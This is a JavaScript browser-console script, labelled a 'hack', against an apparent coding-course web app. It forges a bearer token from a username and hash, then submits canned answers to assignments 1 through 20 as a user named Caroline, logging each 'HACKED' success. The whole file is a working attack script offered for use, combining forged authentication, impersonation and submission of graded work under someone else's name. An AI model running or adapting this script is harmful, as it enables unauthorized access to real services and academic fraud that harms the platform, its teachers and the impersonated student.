// OPTIMIZED PATTERN-BASED HACK - Only uses the working endpoint!

(async function() {
    const CAROLINE = "98ixul";
    const BASE = "https://coolcode-hacker-34c5455cd908.herokuapp.com";
    const TOKEN = btoa(JSON.stringify({username: CAROLINE, hash: "06b74b549d5075a14f21bcaf8553848a87e86738313255dbd2d68838384005290"}));
    const ANSWERS = [".java", ".class", "JRE", "To locate the Java compiler", "Compilation", "OutOfMemoryError"];
    
    console.log("🎯 OPTIMIZED HACK - Using only the working endpoint!");
    
    let successCount = 0;
    
    for (let i = 1; i <= 20; i++) {
        try {
            console.log(`🚀 Hacking assignment ${i}...`);
            
            // Use ONLY the working endpoint pattern
            const response = await fetch(`${BASE}/ui/assignment/${i}/submit`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json', 
                    'Authorization': `Bearer ${TOKEN}`, 
                    'X-User': CAROLINE
                },
                body: JSON.stringify({
                    username: CAROLINE, 
                    user: CAROLINE, 
                    userId: CAROLINE, 
                    assignment_id: i, 
                    answers: ANSWERS
                })
            });
            
            if (response.status === 200) {
                successCount++;
                console.log(`✅ Assignment ${i} HACKED for Caroline! (${successCount}/20)`);
            } else {
                console.log(`❌ Assignment ${i} failed with status: ${response.status}`);
            }
            
        } catch (error) {
            console.log(`❌ Assignment ${i} error:`, error.message);
        }
        
        // Small delay
        await new Promise(r => setTimeout(r, 300));
    }
    
    console.log(`🎉 HACK COMPLETE! ${successCount}/20 assignments successfully submitted for Caroline!`);
    
    if (successCount === 20) {
        console.log("🏆 PERFECT SCORE! All assignments hacked!");
    }
})();
